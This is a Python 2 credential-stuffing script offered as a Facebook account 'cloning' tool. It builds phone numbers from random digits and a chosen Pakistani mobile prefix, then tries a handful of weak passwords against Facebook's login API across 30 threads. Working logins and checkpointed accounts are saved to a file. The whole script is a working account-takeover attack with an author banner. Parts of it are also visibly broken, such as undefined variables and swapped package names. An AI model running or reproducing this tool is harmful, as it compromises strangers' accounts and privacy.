#!/usr/bin/python2
#coding=utf-8
import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass
os.system('rm -rf .txt')
for n in range(10000):

    nmbr = random.randint(1111111, 9999999)
    
    sys.stdout = open('.txt', 'a')

    print(nmbr)

    sys.stdout.flush()
    
try:
    import requests
except ImportError:
    os.system('pip2 install mechanize')
    
try:
    import mechanize
except ImportError:
    os.system('pip2 install request')
    time.sleep(1)
    os.system('Then type: MAAN_KHAN404.py')

import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Mozilla/5.0 (Linux; Android 11; V2036) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36')]
br.addheaders = [('user-agent','Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]

def keluar():
	print 'Thanks.'
	os.sys.exit()

def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(00000.1)
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;93mMAAN_KHAN404–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’â–’..99% \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
oks = []
id = []
cpb = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")
print  """


\033[1;91m   _____ _    _          _   _ _____  
\033[1;92m  / ____| |  | |   /\   | \ | |  __ \ 
\033[1;93m | |    | |__| |  /  \  |  \| | |  | |
\033[1;94m | |    |  __  | / /\ \ | . ` | |  | |
\033[1;95m | |____| |  | |/ ____ \| |\  | |__| |
\033[1;96m  \_____|_|  |_/_/    \_\_| \_|_____/ 
                                      
                                      

"""

####Logo####

logo1 = """

\033[1;92m ██████ ██   ██  █████  ███    ██ ██████  
\033[1;93m██      ██   ██ ██   ██ ████   ██ ██   ██ 
\033[1;94m██      ███████ ███████ ██ ██  ██ ██   ██ 
\033[1;95m██      ██   ██ ██   ██ ██  ██ ██ ██   ██ 
\033[1;96m ██████ ██   ██ ██   ██ ██   ████ ██████  
  \033[1;91mFacebook  Chand Ansari                                    
  \033[1;91mwhatsap    03044022389                                  
  \033[1;91mFROME.     PUNJAB
\033[1;97m                                   ''''''''''!!!!!!!!!!!!!!
"""
logo2 = """
\033[1;91m                    ,.

                                                         
                                                         
\033[1;92m         ____   ____    ____      _     ___      ___________   
\033[1;93m          6MMMMb/ `MM'    `MM'     dM.    `MM\     `M'`MMMMMMMb. 
\033[1;94m         8P    YM  MM      MM     ,MMb     MMM\     M  MM    `Mb 
\033[1;95m        6M      Y  MM      MM     d'YM.    M\MM\    M  MM     MM 
\033[1;91m        MM         MM      MM    ,P `Mb    M \MM\   M  MM     MM 
\033[1;92m        MM         MMMMMMMMMM    d'  YM.   M  \MM\  M  MM     MM 
\033[1;93m        MM         MM      MM   ,P   `Mb   M   \MM\ M  MM     MM 
\033[1;94m        MM         MM      MM   d'    YM.  M    \MM\M  MM     MM 
\033[1;95m        YM      6  MM      MM  ,MMMMMMMMb  M     \MMM  MM     MM 
\033[1;96m         8b    d9  MM      MM  d'      YM. M      \MM  MM    .M9 
\033[1;92m          YMMMM9  _MM_    _MM_dM_     _dMM_M_      \M _MMMMMMM9' 
 \033[1;92mFacebook   ChaNd Ansari                                                    
  \033[1;92mwhatsap    Chand Ansari                                                
  \033[1;92mGanGstar OF ZEEKO                                        

"""
Username = "302"
CorrectPasscode = "302"

loop = 'true'
while (loop == 'true'):
    passcode = raw_input("\033[1;92m[?] \x1b[1;91mPASSWORD \x1b[1;95m: ")
    if (passcode == CorrectPasscode):
            print """
            \033[1;92mWelcome to All friend
                  """
            loop = 'false'
    else:
            print "\033[1;91mâ˜ ï¸WRONG"
            os.system('xdg-open https://www.facebook.com/mubshar.yasin')

##### LICENSE #####
#=================#
def lisensi():
    os.system('clear')
    login()
####login#########
def login():
    os.system('clear')
    print logo1
    print "\033[1;96m[1]\x1b[1;93mStart cloning ( no login )"
    time.sleep(0.05)
    print '\x1b[1;95m[0]\033[1;92m Exit (Coming Soon)'
    pilih_login()

def pilih_login():
    peak = raw_input("\n\033[1;93mCHOOSE: \033[1;91m")
    if peak =="":
        print "\x1b[1;95mFill In Correctly"
        pilih_login()
    elif peak =="1":
        Zeek()
def Zeek():
    os.system('clear')
    print logo1
    print '\x1b[1;91m[1]  Start Cracking'
    time.sleep(0.05)
    print '\x1b[1;92m[0] \033[1;93m Back'
    time.sleep(0.05)
    action()

def action():
    peak = raw_input('\n\033[1;95mCHOOSE:\033[1;97m')
    if peak =='':
        print '[!] Fill In Correctly'
        action()
    elif peak =="1":              
        os.system("clear")
        print logo2
        print "Enter any Pakistani Mobile code Number"+'\n'
        print ' Enter any code 1 to 49'
        try:
            c = raw_input("\033[1;96mCHOOSE : ")
            k="03"
            idlist = ('.txt')
            for line in open(idlist,"r").readlines():
                id.append(line.strip())
        except IOError:
            print ("[!] File Not Found")
            raw_input("\n[ Back ]")
            blackmafiax()
    elif peak =='0':
        login()
    else:
        print '[!] Fill In Correctly'
        action()
    print 50* '\033[1;91m-'
    xxx = str(len(id))
    jalan ('\033[1;91m Total ids number: '+xxx)
    jalan ('\033[1;93mCode you choose: '+c)
    jalan ("\033[1;95mTotal 5 password will clone CHaNd TooLs11 digit , last 7 digit, pakistan, 000786, 786786 password Start Cracking...")
    jalan ("\033[1;96mTo Stop Process Press Ctrl+z")
    print 50* '\033[1;92m-'
    def main(arg):
        global cpb,oks
        user = arg
        try:
            os.mkdir('save')
        except OSError:
            pass
        try:
            pass1 = user
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;91m(OK)  ' + k + c + user + '  |  ' + pass1                                       
                okb = open('save/cloned.txt', 'a')
                okb.write(k+c+user+pass1+'\n')
                okb.close()
                oks.append(c+user+pass1)
            else:
                if 'www.facebook.com' in q['error_msg']:
                    print '\033[1;91m(CP) ' + k + c + user + '  |  ' + pass1
                    cps = open('save/cloned.txt', 'a')
                    cps.write(k+c+user+pass1+'\n')
                    cps.close()
                    cpb.append(c+user+pass1)
                else:
                    pass2 = k + c + user
                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;93m(OK)  ' + k + c + user +  '  |  ' + pass2
                        okb = open('save/cloned.txt', 'a')
                        okb.write(k+c+user+pass2+'\n')
                        okb.close()
                        oks.append(c+user+pass2)
                    else:
                        if 'www.facebook.com' in q['error_msg']:
                            print '\033[1;93m(CHAND_CP) ' + k + c + user + '  |  ' + pass2
                            cps = open('save/cloned.txt', 'a')
                            cps.write(k+c+user+pass2+'\n')
                            cps.close()
                            cpb.append(c+user+pass2)
                        else:
                            pass3="khankhankhan"
                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;95m(OK)  ' + k + c + user + '  |  ' + pass3
                                okb = open('save/cloned.txt', 'a')
                                okb.write(k+c+user+pass3+'\n')
                                okb.close()
                                oks.append(c+user+pass3)
                            else:
                                if 'www.facebook.com' in q['error_msg']:
                                    print '\033[1;94m(CHAND_CP) ' + k + c + user + '  |  ' + pass3 
                                    cps = open('save/cloned.txt', 'a')
                                    cps.write(k+c+user+pass3+'\n')
                                    cps.close()
                                    cpb.append(c+user+pass3)
                                else:
                                    pass4="334455"
                                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        print '\x1b[1;96m(OK)  ' + k + c + user + '  |  ' + pass4 
                                        okb = open('save/cloned.txt', 'a')
                                        okb.write(k+c+user+pass4+'\n')
                                        okb.close()
                                        oks.append(c+user+pass4)
                                    else:
                                        if 'www.facebook.com' in q['error_msg']:
                                            print '\033[1;96m(CHAND_CP) ' + k + c + user + '  |  ' + pass4
                                            cps = open('save/cloned.txt', 'a')
                                            cps.write(k+c+user+pass4+'\n')
                                            cps.close()
                                            cpb.append(c+user+pass4)
                                        else:
                                            pass5="@@$$@@"
                                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                            q = json.load(data)
                                            if 'access_token' in q:
                                                print '\x1b[1;94m(OK)  ' + k + c + user + '  |  ' + pass5
                                                okb = open('save/cloned.txt', 'a')
                                                okb.write(k+c+user+pass5+'\n')
                                                okb.close()
                                                oks.append(c+user+pass5)
                                            else:
                                                if 'www.facebook.com' in q['error_msg']:
                                                    print '\033[1;94m(CHAND_CP) ' + k + c + user + '  |  ' + pass5 
                                                    cps = open('save/cloned.txt', 'a')
                                                    cps.write(k+c+user+pass5+'\n')
                                                    cps.close()
                                                    cpb.append(c+user+pass5)
                                                                                                                                                                                                                
                                                                                                                                                                                                                
                                                                                                                                                                                                            
                                                                                                                                                                                                            
                                                                                                                                                                                                            
                                                                                                                                                                                                            
                                                                                                                                                                                                            


                                                                                                                                                                                                            
                                                                                                                                                                                                                    
                                                                                                                                                                                                            



        except:
            pass
        
    p = ThreadPool(30)
    p.map(main, id)
    print 50* '\033[1;91m-'
    print 'Hamayun Process Has Been Completedâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’...100%'
    print 'Total OK/CP : '+str(len(oks))+'/'+str(len(cpb))
    print('Hamayun Cloned Accounts Has Been Saved : save/cloned.txt')
    jalan("Note : Your (CP)Accounts Open after 5 to 8 days")
    print ''
    print """
    
    
    
    
\033[1;91mThanks \033[1;97mUsing My Tool
"""

    
    raw_input("\n\033[1;92m[\033[1;92mBack\033[1;95m]")
    login() 
          
if __name__ == '__main__':
    login()



